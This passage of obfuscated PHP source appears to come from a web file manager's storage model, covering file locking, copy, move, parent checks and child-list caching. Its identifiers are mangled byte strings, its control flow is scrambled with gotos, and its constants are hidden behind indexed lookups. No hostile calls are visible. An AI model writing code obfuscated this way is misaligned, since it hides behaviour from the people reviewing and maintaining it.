$CÄœ×İçò); $this->_lockKey($AŞõ°çÇ³í, 1); $this->_lockKey($AŞõ°çÇ³í, 0); } } goto A´’¹ëÎ™; A´’¹ëÎ™: } private function _lockCheckEnd($eÈîøéóÎÍ, $eÈƒ¾Şæ“¼) { goto d“é™Ü“†; BŸ¶ÛÀ—’: if (!isset($this->_lockTimeStart[$DµÛ†¸ëµ])) { return; } $Aª»çê¦ÏÊ = timeFloat() - $this->_lockTimeStart[$DµÛ†¸ëµ]; unset($this->_lockTimeStart[$DµÛ†¸ëµ]); goto C‰óÄ‡©¥¿; C‰óÄ‡©¥¿: if ($Aª»çê¦ÏÊ > 0.5) { unset(self::$cacheSourceInfo[$a¤†±ƒÑÖÏ[410] . $eÈƒ¾Şæ“¼]); } $f•‚õË¾šá = $this->sourceInfo($eÈƒ¾Şæ“¼); if (!$f•‚õË¾šá) { show_json(LNG($a¤†±ƒÑÖÏ[101]), !1); } goto bœÄÜÔõË¢; d“é™Ü“†: $a¤†±ƒÑÖÏ =& $_SERVER[Î¿—”òá]; $DµÛ†¸ëµ = $eÈîøéóÎÍ . $a¤†±ƒÑÖÏ[91] . $eÈƒ¾Şæ“¼; CacheLock::setErrorMsg($a¤†±ƒÑÖÏ[361]); goto BŸ¶ÛÀ—’; bœÄÜÔõË¢: } private function _lockParent($DíÅĞ¶Ø»¨, $CŠ„æßù®, $e†ŠÒé“¥) { if (!$this->autoLockSet) { return; } $bÃ‘áªª„« = $this->sourceInfo($DíÅĞ¶Ø»¨); if (!is_array($bÃ‘áªª„«)) { return; } $CªµÇßŒ»½ = array_reverse($this->parentLevelArray($bÃ‘áªª„«[$_SERVER[Î¿—”òá][459]])); foreach ($CªµÇßŒ»½ as $d¼Å©î©äâ) { $this->_lockEvent($d¼Å©î©äâ, $CŠ„æßù®, $e†ŠÒé“¥); } } private function _lockEvent($D¨‹óíïó½, $c…ˆŞÂ²Ëæ, $A‰ŞÛ…—) { $eÍÌÉ‚½‘¤ =& $_SERVER[Î¿—”òá]; if (!$this->autoLockSet) { return; } foreach ($c…ˆŞÂ²Ëæ as $Có ÌÄæ÷Ó) { $a¨´ß·´†” = $Có ÌÄæ÷Ó . $eÍÌÉ‚½‘¤[91] . $D¨‹óíïó½; if ($A‰ŞÛ…— && CacheLock::lockGet($eÍÌÉ‚½‘¤[500] . $a¨´ß·´†”)) { continue; } $this->_lockKey($a¨´ß·´†”, $A‰ŞÛ…—); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dëà‘¾¹±”, $A£¡×‰¨¼È = 1) { $D ´—‹Ô—¶ = $_SERVER[Î¿—”òá][500] . md5($dëà‘¾¹±”); if ($A£¡×‰¨¼È) { if (isset(self::$_lockItemArr[$D ´—‹Ô—¶])) { return; } self::$_lockItemArr[$D ´—‹Ô—¶] = 1; CacheLock::lock($D ´—‹Ô—¶, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$D ´—‹Ô—¶])) { return; } unset(self::$_lockItemArr[$D ´—‹Ô—¶]); CacheLock::unlock($D ´—‹Ô—¶); } } public function isParentOf($AŒè†¬Ò®, $B©Ÿ×ç®Ê) { goto Bë›®ÜŒË; BœŞéîÁ™: $d×öİ½÷Ô = $f÷éœÎ£°ô[$f«³·ø˜[459]] . $f÷éœÎ£°ô[$f«³·ø˜[369]] . $f«³·ø˜[47]; $fç›Õ„”ŸÜ = $D‘ğ›»â‚[$f«³·ø˜[459]] . $D‘ğ›»â‚[$f«³·ø˜[369]] . $f«³·ø˜[47]; $cÍÔ‹ä£èá = strpos($fç›Õ„”ŸÜ, $d×öİ½÷Ô) === 0; goto FÒœ«ŠæÒö; FÒœ«ŠæÒö: return $cÍÔ‹ä£èá; goto b¢ÚßŒé; Bë›®ÜŒË: $f«³·ø˜ =& $_SERVER[Î¿—”òá]; $f÷éœÎ£°ô = $this->sourceInfo($AŒè†¬Ò®); $D‘ğ›»â‚ = $this->sourceInfo($B©Ÿ×ç®Ê); goto BœŞéîÁ™; b¢ÚßŒé: } private $targetIsDelete = 0; public function copy($f¤í¥µ¾Ğí, $f¬ŠµÀÔº, $fã‚Åã¡´– = REPEAT_REPLACE, $dšæëâÚ‘ = '') { goto f‘òÀ±ÛÖñ; BãÙ­¯¢è£: $this->targetIsDelete = intval($fŒé¤Õ¿[$aéÃõ„‘«[397]]); $C­âóóËé¹ = $this->fileNameExistCache($f¬ŠµÀÔº, $fŒé¤Õ¿[$aéÃõ„‘«[28]]); $bÒğÄÌéÒ£ = $this->_copy($f¤í¥µ¾Ğí, $f¬ŠµÀÔº, $fã‚Åã¡´–, $DŒ˜ÉğéÄİ, !0, $dšæëâÚ‘); goto eÑ™­²ˆÓæ; eÑ™­²ˆÓæ: $this->_childrenListClear(); $this->lockCopyEnd($f¤í¥µ¾Ğí); $this->lockWriteEnd($f¬ŠµÀÔº, $aæ”²Áë); goto EîîÈºÓÜÇ; AåÙ‰„–Ö–: if (!$fŒé¤Õ¿ || !$eƒ•´”Òó || $eƒ•´”Òó[$aéÃõ„‘«[370]] != $aéÃõ„‘«[83]) { return !1; } if ($this->isParentOf($f¤í¥µ¾Ğí, $f¬ŠµÀÔº)) { return !1; } $aæ”²Áë = $dšæëâÚ‘ ? $dšæëâÚ‘ : $fŒé¤Õ¿[$aéÃõ„‘«[28]]; goto Eë¥‰ÉÚ³å; Eë¥‰ÉÚ³å: $this->lockCopyStart($f¤í¥µ¾Ğí); $this->lockWriteStart($f¬ŠµÀÔº, $aæ”²Áë); $DŒ˜ÉğéÄİ = array($aéÃõ„‘«[501] => array(), $aéÃõ„‘«[502] => array(), $aéÃõ„‘«[503] => array()); goto BãÙ­¯¢è£; EîîÈºÓÜÇ: if ($fŒé¤Õ¿[$aéÃõ„‘«[370]] == $aéÃõ„‘«[83] && $C­âóóËé¹ == $bÒğÄÌéÒ£) { $this->folderSizeResetChildren($C­âóóËé¹); } Model($aéÃõ„‘«[504])->addAll($DŒ˜ÉğéÄİ[$aéÃõ„‘«[502]], array(), !0); if ($C­âóóËé¹ != $bÒğÄÌéÒ£ || $fŒé¤Õ¿[$aéÃõ„‘«[370]] == $aéÃõ„‘«[83]) { Model($aéÃõ„‘«[505])->eventCopy($bÒğÄÌéÒ£); } goto cíù¿Ò¹ƒ«; f‘òÀ±ÛÖñ: $aéÃõ„‘« =& $_SERVER[Î¿—”òá]; $fŒé¤Õ¿ = $this->sourceInfo($f¤í¥µ¾Ğí); $eƒ•´”Òó = $this->sourceInfo($f¬ŠµÀÔº); goto AåÙ‰„–Ö–; cíù¿Ò¹ƒ«: $this->saveAll($DŒ˜ÉğéÄİ[$aéÃõ„‘«[503]]); Model($aéÃõ„‘«[167])->linkAdd($DŒ˜ÉğéÄİ[$aéÃõ„‘«[501]]); $this->folderSizeReset($f¬ŠµÀÔº); goto Bì„šé¸; Bì„šé¸: $this->updateModifyTime($f¬ŠµÀÔº); return $bÒğÄÌéÒ£; goto DÜ¯È˜˜®¤; DÜ¯È˜˜®¤: } private function _copy($dÎÅ²æÊå“, $CÃ¤˜äÄ”, $fø¼ŠÊ­¦Õ, &$f†ôÑ½Ü–‰, $Fœ½Ò“‡‘, $b…Üé‹ğ‘É = '') { goto aåæˆÍÌ »; c‹¼¬àæˆõ: $AÁ®™„èÇ = $b…Üé‹ğ‘É ? $b…Üé‹ğ‘É : $BöŒµÒ¼À[$eÈ†ø›ä“î[28]]; $FÄßÓŒˆÈ° = $this->fileNameExistCache($CÃ¤˜äÄ”, $AÁ®™„èÇ); if ($Fœ½Ò“‡‘) { $this->_childrenAllMake($dÎÅ²æÊå“); if ($cœÎ¦¡‘±š && $FÄßÓŒˆÈ°) { $this->_childrenAllMake($FÄßÓŒˆÈ°); } } goto f„ÁÃÉôè™; e•Öòó²îë: return $F­öÎ²à—Ù; goto aí¿äÎ·’; aåæˆÍÌ »: $eÈ†ø›ä“î =& $_SERVER[Î¿—”òá]; $BöŒµÒ¼À = $this->sourceInfoCache($dÎÅ²æÊå“); $cœÎ¦¡‘±š = $BöŒµÒ¼À[$eÈ†ø›ä“î[370]] == $eÈ†ø›ä“î[83]; goto c‹¼¬àæˆõ; f„ÁÃÉôè™: if (!$FÄßÓŒˆÈ°) { return $this->_copyCreate($dÎÅ²æÊå“, $CÃ¤˜äÄ”, $AÁ®™„èÇ, $f†ôÑ½Ü–‰); } $F­öÎ²à—Ù = $FÄßÓŒˆÈ°; if ($cœÎ¦¡‘±š) { if ($fø¼ŠÊ­¦Õ == REPEAT_RENAME_FOLDER) { $AÁ®™„èÇ = $this->fileNameAutoCache($CÃ¤˜äÄ”, $AÁ®™„èÇ, $fø¼ŠÊ­¦Õ, $cœÎ¦¡‘±š); $F­öÎ²à—Ù = $this->_copyCreate($dÎÅ²æÊå“, $CÃ¤˜äÄ”, $AÁ®™„èÇ, $f†ôÑ½Ü–‰); } else { $dÓ³»Ç¼ = $this->_childrenList($dÎÅ²æÊå“); foreach ($dÓ³»Ç¼ as $A‹’¦‹²Ò) { $this->_copy($A‹’¦‹²Ò[$eÈ†ø›ä“î[369]], $FÄßÓŒˆÈ°, $fø¼ŠÊ­¦Õ, $f†ôÑ½Ü–‰, !1); } } } else { if ($fø¼ŠÊ­¦Õ == REPEAT_RENAME || $fø¼ŠÊ­¦Õ == REPEAT_RENAME_FOLDER) { $AÁ®™„èÇ = $this->fileNameAutoCache($CÃ¤˜äÄ”, $AÁ®™„èÇ, $fø¼ŠÊ­¦Õ, $cœÎ¦¡‘±š); $F­öÎ²à—Ù = $this->_copyCreate($dÎÅ²æÊå“, $CÃ¤˜äÄ”, $AÁ®™„èÇ, $f†ôÑ½Ü–‰); } else { if ($fø¼ŠÊ­¦Õ == REPEAT_REPLACE) { $bŞÔ¸ä‰èÑ = $this->sourceInfoCache($FÄßÓŒˆÈ°); $bÕÙÆïªí‡ = $this->fileHistory($bŞÔ¸ä‰èÑ, $BöŒµÒ¼À[$eÈ†ø›ä“î[419]], $BöŒµÒ¼À[$eÈ†ø›ä“î[77]]); if ($bÕÙÆïªí‡) { $f†ôÑ½Ü–‰[$eÈ†ø›ä“î[501]][] = $BöŒµÒ¼À[$eÈ†ø›ä“î[419]]; } } else { if ($fø¼ŠÊ­¦Õ == REPEAT_SKIP) { } } } Hook::trigger($eÈ†ø›ä“î[506], array($eÈ†ø›ä“î[507], $BöŒµÒ¼À, 0)); } goto e•Öòó²îë; aí¿äÎ·’: } private function _copyCreate($fÎÜ˜¿œğˆ, $F±·Ó¶ã¯, $fòî¬›«í“, &$BŞëÒŸ‚Èï) { goto C”µ²•…š; e¯£í¾®å: $B’æÇÛ“ãÏ = $this->add($dâ¼Šòö¹÷); $BÈÁÆÂÏçè = array($bÎ©•öšš™[369] => $B’æÇÛ“ãÏ, $bÎ©•öšš™[28] => $fòî¬›«í“); $this->_copyApplyMeta($BÈÁÆÂÏçè, $BŞëÒŸ‚Èï); goto Aé«Ëë™†µ; B‡è…±›«: $this->_childrenListAll($fÎÜ˜¿œğˆ, $F¼¬í½«Õ’); $B¸·Ÿ®Í…¾ = count($F¼¬í½«Õ’); if ($B¸·Ÿ®Í…¾ == 0) { return $B’æÇÛ“ãÏ; } goto C‹¬äÓ˜Ã; F¬Ş†…öÍ¡: foreach ($fÑã–‰İ„Õ as $B‰½É‹¬Ÿó) { $D­™¬·®î» = $B‰½É‹¬Ÿó[$bÎ©•öšš™[369]]; $A¹ˆäİóà = $this->_childrenMatch($cÛÜÛ¥İˆ, $B‰½É‹¬Ÿó, $a„•˜°Î„Œ); $D¤‰‹ñ÷ø[] = array($bÎ©•öšš™[369], $D­™¬·®î», $bÎ©•öšš™[461], $A¹ˆäİóà[$bÎ©•öšš™[461]]); $eõ›Óğ¸˜“[] = array($bÎ©•öšš™[369], $D­™¬·®î», $bÎ©•öšš™[459], $A¹ˆäİóà[$bÎ©•öšš™[459]]); $this->_copyApplyMeta($B‰½É‹¬Ÿó, $BŞëÒŸ‚Èï); if ($B‰½É‹¬Ÿó[$bÎ©•öšš™[370]] != $bÎ©•öšš™[83]) { $BŞëÒŸ‚Èï[$bÎ©•öšš™[501]][] = $B‰½É‹¬Ÿó[$bÎ©•öšš™[419]]; } } $this->chunkEventSet($bÎ©•öšš™[513], array($bÎ©•öšš™[514], $dâ¼Šòö¹÷, $B¸·Ÿ®Í…¾)); $this->saveAll($D¤‰‹ñ÷ø); goto e®×ÖÛƒ˜º; e®×ÖÛƒ˜º: $this->chunkEventSet($bÎ©•öšš™[515], array($bÎ©•öšš™[516], $dâ¼Šòö¹÷, $B¸·Ÿ®Í…¾)); $this->saveAll($eõ›Óğ¸˜“); return $B’æÇÛ“ãÏ; goto cÀËèÌ»¸‡; C‹¬äÓ˜Ã: $a„•˜°Î„Œ = $this->sourceInfo($B’æÇÛ“ãÏ); foreach ($F¼¬í½«Õ’ as $B‰½É‹¬Ÿó) { $cÄ›×õËŸÃ = $this->_makeItemData($B‰½É‹¬Ÿó, $a„•˜°Î„Œ, $B‰½É‹¬Ÿó[$bÎ©•öšš™[28]]); $cÄ›×õËŸÃ[$bÎ©•öšš™[459]] = $B‰½É‹¬Ÿó[$bÎ©•öšš™[459]]; $Bë¬³¬Í[] = $cÄ›×õËŸÃ; } $this->chunkEventSet($bÎ©•öšš™[511], array($bÎ©•öšš™[512], $dâ¼Šòö¹÷, $B¸·Ÿ®Í…¾)); goto e¶õ×¯÷ŞÄ; C”µ²•…š: $bÎ©•öšš™ =& $_SERVER[Î¿—”òá]; $b¹ìÃĞ˜½¤ = $this->sourceInfoCache($fÎÜ˜¿œğˆ); $CŸ¾İ½·– = $this->sourceInfoCache($F±·Ó¶ã¯); goto EÊèã¸“î; e¶õ×¯÷ŞÄ: $this->addAll($Bë¬³¬Í, array(), !1); $fÑã–‰İ„Õ = $this->where(array($bÎ©•öšš™[461] => $B’æÇÛ“ãÏ))->select(); $cÛÜÛ¥İˆ = $this->_childrenMakeRelation($F¼¬í½«Õ’, $fÑã–‰İ„Õ); goto A¬ºŒ‡ìò¡; A¬ºŒ‡ìò¡: $cÛÜÛ¥İˆ[$fÎÜ˜¿œğˆ] = $B’æÇÛ“ãÏ; $D¤‰‹ñ÷ø = array(); $eõ›Óğ¸˜“ = array(); goto F¬Ş†…öÍ¡; EÊèã¸“î: $dâ¼Šòö¹÷ = $this->_makeItemData($b¹ìÃĞ˜½¤, $CŸ¾İ½·–, $fòî¬›«í“); Hook::trigger($bÎ©•öšš™[508], $dâ¼Šòö¹÷); Hook::trigger($bÎ©•öšš™[509], array($bÎ©•öšš™[510], $dâ¼Šòö¹÷, 0)); goto e¯£í¾®å; Aé«Ëë™†µ: if ($b¹ìÃĞ˜½¤[$bÎ©•öšš™[370]] != $bÎ©•öšš™[83]) { $BŞëÒŸ‚Èï[$bÎ©•öšš™[501]][] = $b¹ìÃĞ˜½¤[$bÎ©•öšš™[419]]; return $B’æÇÛ“ãÏ; } $F¼¬í½«Õ’ = array(); $Bë¬³¬Í = array(); goto B‡è…±›«; cÀËèÌ»¸‡: } private function _childrenMakeRelation($B¡¡ùÑœØ±, $aŒÎ¯­‰œ) { $aĞ…ÜÑ¹Ùİ =& $_SERVER[Î¿—”òá]; $a£İğ—à›Ò = array(); $b‘õ²…Œ°¬ = array(); foreach ($B¡¡ùÑœØ± as $F‰’Ÿ–ÍÑÚ) { $D à±«›è› = $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[28]] . $aĞ…ÜÑ¹Ùİ[8] . $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[459]]; $a£İğ—à›Ò[$D à±«›è›] = $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[369]]; } foreach ($aŒÎ¯­‰œ as $F‰’Ÿ–ÍÑÚ) { $D à±«›è› = $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[28]] . $aĞ…ÜÑ¹Ùİ[8] . $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[459]]; $BÖã™ÅÀ—Š = $a£İğ—à›Ò[$D à±«›è›]; $b‘õ²…Œ°¬[$BÖã™ÅÀ—Š] = $F‰’Ÿ–ÍÑÚ[$aĞ…ÜÑ¹Ùİ[369]]; } return $b‘õ²…Œ°¬; } private function _childrenMatch($EÙ¤‹ˆ§‡, $cğÚÜÆ‰ä·, $EÊàˆøôæƒ) { goto b«Äó‚º›Ñ; EÓÈ®ŸÂ¢Ó: $B³†ˆŒµØ£ = $cê¼êŠÈ[count($cê¼êŠÈ) - 1]; return array($d³³Æ³‘[461] => $B³†ˆŒµØ£, $d³³Æ³‘[459] => $eÀÌº¤ó–í); goto cõ˜­ŸãŒ±; bø›äá¨À‚: foreach ($b¶ôšÛ“ØË as $E¦ÕÉÇ•È) { if (isset($EÙ¤‹ˆ§‡[$E¦ÕÉÇ•È])) { $eÀÌº¤ó–í .= $EÙ¤‹ˆ§‡[$E¦ÕÉÇ•È] . $d³³Æ³‘[517]; } } $eÀÌº¤ó–í = rtrim($eÀÌº¤ó–í, $d³³Æ³‘[47]) . $d³³Æ³‘[47]; $cê¼êŠÈ = $this->parentLevelArray($eÀÌº¤ó–í); goto EÓÈ®ŸÂ¢Ó; b«Äó‚º›Ñ: $d³³Æ³‘ =& $_SERVER[Î¿—”òá]; $eÀÌº¤ó–í = $EÊàˆøôæƒ[$d³³Æ³‘[459]]; $b¶ôšÛ“ØË = $this->parentLevelArray($cğÚÜÆ‰ä·[$d³³Æ³‘[459]]); goto bø›äá¨À‚; cõ˜­ŸãŒ±: } private function _makeItemData($bíÓ‘›ïÕµ, $a·–êÙø¶, $aº¬æó„µ) { $Bš‡ñ×³‡Î =& $_SERVER[Î¿—”òá]; $aè²¸ÏÁØÅ = array($Bš‡ñ×³‡Î[518] => $bíÓ‘›ïÕµ[$Bš‡ñ×³‡Î[370]], $Bš‡ñ×³‡Î[386] => $aº¬æó„µ, $Bš‡ñ×³‡Î[519] => $bíÓ‘›ïÕµ[$Bš‡ñ×³‡Î[372]], $Bš‡ñ×³‡Î[420] => $bíÓ‘›ïÕµ[$Bš‡ñ×³‡Î[419]], $Bš‡ñ×³‡Î[520] => $bíÓ‘›ïÕµ[$Bš‡ñ×³‡Î[77]], $Bš‡ñ×³‡Î[521] => $a·–êÙø¶[$Bš‡ñ×³‡Î[371]], $Bš‡ñ×³‡Î[522] => $a·–êÙø¶[$Bš‡ñ×³‡Î[456]], $Bš‡ñ×³‡Î[523] => USER_ID, $Bš‡ñ×³‡Î[524] => USER_ID, $Bš‡ñ×³‡Î[368] => $a·–êÙø¶[$Bš‡ñ×³‡Î[369]], $Bš‡ñ×³‡Î[525] => $a·–êÙø¶[$Bš‡ñ×³‡Î[459]] . $a·–êÙø¶[$Bš‡ñ×³‡Î[369]] . $Bš‡ñ×³‡Î[47], $Bš‡ñ×³‡Î[396] => 0, $Bš‡ñ×³‡Î[526] => $Bš‡ñ×³‡Î[33]); return $aè²¸ÏÁØÅ; } private function _copyApplyMeta($eó»Ö‡òòà, &$cà«÷ìÉĞ½) { $fÄïùÎÀçÙ =& $_SERVER[Î¿—”òá]; $dÛÊ‚¾Âë = $eó»Ö‡òòà[$fÄïùÎÀçÙ[369]]; $B†“¹´¿Æƒ = $eó»Ö‡òòà[$fÄïùÎÀçÙ[28]]; if (!isset($eó»Ö‡òòà[$fÄïùÎÀçÙ[527]]) || !$eó»Ö‡òòà[$fÄïùÎÀçÙ[527]] || $eó»Ö‡òòà[$fÄïùÎÀçÙ[527]] == $fÄïùÎÀçÙ[468]) { $cà«÷ìÉĞ½[$fÄïùÎÀçÙ[503]][] = array($fÄïùÎÀçÙ[369], $dÛÊ‚¾Âë, $fÄïùÎÀçÙ[527], short_id($dÛÊ‚¾Âë)); } if (Input::check($B†“¹´¿Æƒ, $fÄïùÎÀçÙ[528])) { $cà«÷ìÉĞ½[$fÄïùÎÀçÙ[502]][] = array($fÄïùÎÀçÙ[369] => $dÛÊ‚¾Âë, $fÄïùÎÀçÙ[89] => $fÄïùÎÀçÙ[416], $fÄïùÎÀçÙ[359] => str_replace($fÄïùÎÀçÙ[50], $fÄïùÎÀçÙ[33], Pinyin::encode($B†“¹´¿Æƒ))); $cà«÷ìÉĞ½[$fÄïùÎÀçÙ[502]][] = array($fÄïùÎÀçÙ[369] => $dÛÊ‚¾Âë, $fÄïùÎÀçÙ[89] => $fÄïùÎÀçÙ[415], $fÄïùÎÀçÙ[359] => Pinyin::encode($B†“¹´¿Æƒ, $fÄïùÎÀçÙ[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b½ê× ä©¶) { goto cÈÚ³¡Š–Ò; cÈÚ³¡Š–Ò: $cñ¯ÎµÔùç =& $_SERVER[Î¿—”òá]; $c™‡àĞƒ‹¯ = $this->sourceInfo($b½ê× ä©¶); $dáÛ—ÖÒÄÏ = $cñ¯ÎµÔùç[530]; goto a½º›¥šº™; a½º›¥šº™: $Føß‘ÌƒƒÅ = array($cñ¯ÎµÔùç[459] => array($cñ¯ÎµÔùç[483], $c™‡àĞƒ‹¯[$cñ¯ÎµÔùç[459]] . $b½ê× ä©¶ . $cñ¯ÎµÔùç[484]), $cñ¯ÎµÔùç[397] => $this->targetIsDelete); $d«†ö£â‹¥ = $this->field($dáÛ—ÖÒÄÏ)->where($Føß‘ÌƒƒÅ)->select(); if (!$d«†ö£â‹¥) { return; } goto fË†…î«°»; fË†…î«°»: $d«†ö£â‹¥ = array_to_keyvalue($d«†ö£â‹¥, $cñ¯ÎµÔùç[369]); foreach ($d«†ö£â‹¥ as $FÃ‡ÃõÍ£À) { $Dİî‡’­ØË = $FÃ‡ÃõÍ£À[$cñ¯ÎµÔùç[461]]; $b½ê× ä©¶ = $FÃ‡ÃõÍ£À[$cñ¯ÎµÔùç[369]]; if (!isset($this->_childrenListCache[$b½ê× ä©¶]) && $FÃ‡ÃõÍ£À[$cñ¯ÎµÔùç[370]] == $cñ¯ÎµÔùç[83]) { $this->_childrenListCache[$b½ê× ä©¶] = array(); } if (!isset($this->_childrenListCache[$Dİî‡’­ØË])) { $this->_childrenListCache[$Dİî‡’­ØË] = array(); } $this->_childrenListCache[$Dİî‡’­ØË][$b½ê× ä©¶] = $FÃ‡ÃõÍ£À; $this->_childrenItemCache[$b½ê× ä©¶] = $FÃ‡ÃõÍ£À; } goto AÈ¡ƒ¶Å½á; AÈ¡ƒ¶Å½á: } private function _childrenListAll($EÒà“”„Ğ, &$F®ˆƒËÂÇ´) { $BºáÉ“§Èè =& $_SERVER[Î¿—”òá]; if (!isset($this->_childrenListCache[$EÒà“”„Ğ])) { return; } $EùßâïêÎÏ = $this->_childrenListCache[$EÒà“”„Ğ]; foreach ($EùßâïêÎÏ as $A¨ØõÕåìÜ => $bçàùÒïñ£) { $F®ˆƒËÂÇ´[$A¨ØõÕåìÜ] = $bçàùÒïñ£; if ($bçàùÒïñ£[$BºáÉ“§Èè[370]] == $BºáÉ“§Èè[83]) { $this->_childrenListAll($A¨ØõÕåìÜ, $F®ˆƒËÂÇ´); } } } private function sourceInfoCache($EËƒÈ›ïˆ) { if (isset($this->_childrenItemCache[$EËƒÈ›ïˆ])) { return $this->_childrenItemCache[$EËƒÈ›ïˆ]; } return $this->sourceInfo($EËƒÈ›ïˆ); } private function _childrenList($BìÚµ“Šˆ²) { if (isset($this->_childrenListCache[$BìÚµ“Šˆ²])) { return $this->_childrenListCache[$BìÚµ“Šˆ²]; } return $this->_childrenListSelect($BìÚµ“Šˆ²); } private function _childrenListSelect($a¿ˆŞÔ¹ö) { goto cÓßá‘—ºÚ; Fä†Ô‚ª: foreach ($aƒ’çíÃóÀ as $a¿ˆŞÔ¹ö => $Cô©‹å³¬) { $this->_childrenItemCache[$a¿ˆŞÔ¹ö] = $Cô©‹å³¬; } return $aƒ’çíÃóÀ; goto CÃ—ÁÆ‰—à; cÓßá‘—ºÚ: $AÊ§ÑéÇÓ =& $_SERVER[Î¿—”òá]; $B³ĞÑ²êéÈ = array($AÊ§ÑéÇÓ[461] => $a¿ˆŞÔ¹ö, $AÊ§ÑéÇÓ[397] => $this->targetIsDelete); $b‘ƒ³Í¤ò = $this->where($B³ĞÑ²êéÈ)->select(); goto D¸åŸº…Î; D¸åŸº…Î: $b‘ƒ³Í¤ò = $b‘ƒ³Í¤ò ? $b‘ƒ³Í¤ò : array(); $aƒ’çíÃóÀ = array_to_keyvalue($b‘ƒ³Í¤ò, $AÊ§ÑéÇÓ[369]); $this->_childrenListCache[$a¿ˆŞÔ¹ö] = $aƒ’çíÃóÀ; goto Fä†Ô‚ª; CÃ—ÁÆ‰—à: } private function fileNameExistCache($AÓá•¿³ò, $f¦Ñ‚Ë›ğÚ) { $FÙîÑùØáÎ =& $_SERVER[Î¿—”òá]; $f¦Ñ‚Ë›ğÚ = strtolower($f¦Ñ‚Ë›ğÚ); $BƒÖÀŸ´¥õ = $this->_childrenList($AÓá•¿³ò); foreach ($BƒÖÀŸ´¥õ as $F¤ÕÏæßÛ÷) { if ($f¦Ñ‚Ë›ğÚ == strtolower($F¤ÕÏæßÛ÷[$FÙîÑùØáÎ[28]])) { return $F¤ÕÏæßÛ÷[$FÙîÑùØáÎ[369]]; } } return !1; } private function fileNameAutoCache($cïÏ¦ó çö, $FË†—±š‹, $a†”¸äÜî¨, $F‡„ÈÄ‚§) { $a¤Æ‡¯Û =& $_SERVER[Î¿—”òá]; $d’¹ÒÎšæ˜ = $this->_childrenList($cïÏ¦ó çö); $Aª–¢›õÒÆ = array_to_keyvalue($d’¹ÒÎšæ˜, $a¤Æ‡¯Û[33], $a¤Æ‡¯Û[28]); return $this->fileNameAutoGet($Aª–¢›õÒÆ, $FË†—±š‹, $a†”¸äÜî¨, $F‡„ÈÄ‚§); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($c¼‘ØË˜Í, $fùŒ‡“µ¿È, $FƒŒøâšÎ¾ = REPEAT_REPLACE, $Aí™–âöß = '') { goto C“µ¤õÓÙ; EÖõä›®–†: return $Eß—«£Ÿìƒ; goto CšÌ¨«£Š; C ¤»…Áå: if ($Cˆ³•ô¾¶[$föõÅñ‰¾§[461]] == $AŞ¸•‚ì[$föõÅñ‰¾§[369]]) { if ($Cˆ³•ô¾¶[$föõÅñ‰¾§[397]] == $föõÅñ‰¾§[83]) { Model($föõÅñ‰¾§[395])->restore(array($c¼‘ØË˜Í)); } return $c¼‘ØË˜Í; } $F¤Ù¨ŒÜÊƒ = $this->pathInfoMore($c¼‘ØË˜Í); if ($this->isParentOf($c¼‘ØË˜Í, $fùŒ‡“µ¿È)) { return !1; } goto AŸŒŒò‚§ß; dâ°˜‡Á†Ş: $this->lockWriteStart($fùŒ‡“µ¿È, $dŒÖ”‹†–); $bÛ·¬½²ºá = array($föõÅñ‰¾§[501] => array(), $föõÅñ‰¾§[533] => !1); $this->clearShare($c¼‘ØË˜Í, $fùŒ‡“µ¿È); goto e†Ğ•œÒ¦; Cª¦ô¸Ó: $this->lockMoveEnd($c¼‘ØË˜Í); $this->lockWriteEnd($fùŒ‡“µ¿È, $dŒÖ”‹†–); $this->folderSizeReset($Cˆ³•ô¾¶[$föõÅñ‰¾§[461]]); goto bªØóÉ×œ; e†Ğ•œÒ¦: $f‰·íòÓ†Æ = $this->fileNameExistCache($fùŒ‡“µ¿È, $Cˆ³•ô¾¶[$föõÅñ‰¾§[28]]); $Eß—«£Ÿìƒ = $this->_move($c¼‘ØË˜Í, $fùŒ‡“µ¿È, $FƒŒøâšÎ¾, $bÛ·¬½²ºá, $Aí™–âöß); $this->sourceCacheClear(); goto b™‹®¹´Œ; A’Üğ¨Åš : if ($Cˆ³•ô¾¶[$föõÅñ‰¾§[461]] == $fùŒ‡“µ¿È && $Aí™–âöß != $Cˆ³•ô¾¶[$föõÅñ‰¾§[28]]) { $CÊÜÎ§°¦‘ = $this->fileNameExist($fùŒ‡“µ¿È, $Aí™–âöß); if ($CÊÜÎ§°¦‘ && $Cˆ³•ô¾¶[$föõÅñ‰¾§[370]] == $föõÅñ‰¾§[468]) { goto FÏ±‘ˆ«âô; FÏ±‘ˆ«âô: $Dƒ„å§Œ = $this->sourceInfo($CÊÜÎ§°¦‘); $aÀ¯É£ÆÜ· = $this->fileHistory($Dƒ„å§Œ, $Cˆ³•ô¾¶[$föõÅñ‰¾§[419]], $Cˆ³•ô¾¶[$föõÅñ‰¾§[77]]); if (!$aÀ¯É£ÆÜ·) { Model($föõÅñ‰¾§[422])->remove($Cˆ³•ô¾¶[$föõÅñ‰¾§[419]]); } goto d²Öò®ªÙª; d²Öò®ªÙª: $this->removeNow($c¼‘ØË˜Í, !1); $this->folderSizeReset($fùŒ‡“µ¿È); Hook::trigger($föõÅñ‰¾§[532], $F¤Ù¨ŒÜÊƒ); goto cò»ˆŠÒÈ; cò»ˆŠÒÈ: return $CÊÜÎ§°¦‘; goto fÍ´Š—²”Â; fÍ´Š—²”Â: } } $dŒÖ”‹†– = $Aí™–âöß ? $Aí™–âöß : $Cˆ³•ô¾¶[$föõÅñ‰¾§[28]]; $this->lockMoveStart($c¼‘ØË˜Í); goto dâ°˜‡Á†Ş; b™‹®¹´Œ: if ($Cˆ³•ô¾¶[$föõÅñ‰¾§[370]] == $föõÅñ‰¾§[83] && $f‰·íòÓ†Æ) { $this->folderSizeResetChildren($Eß—«£Ÿìƒ); } Model($föõÅñ‰¾§[167])->linkAdd($bÛ·¬½²ºá[$föõÅñ‰¾§[501]]); if ($f‰·íòÓ†Æ && $bÛ·¬½²ºá[$föõÅñ‰¾§[533]]) { $this->removeNow($c¼‘ØË˜Í, !1); } goto 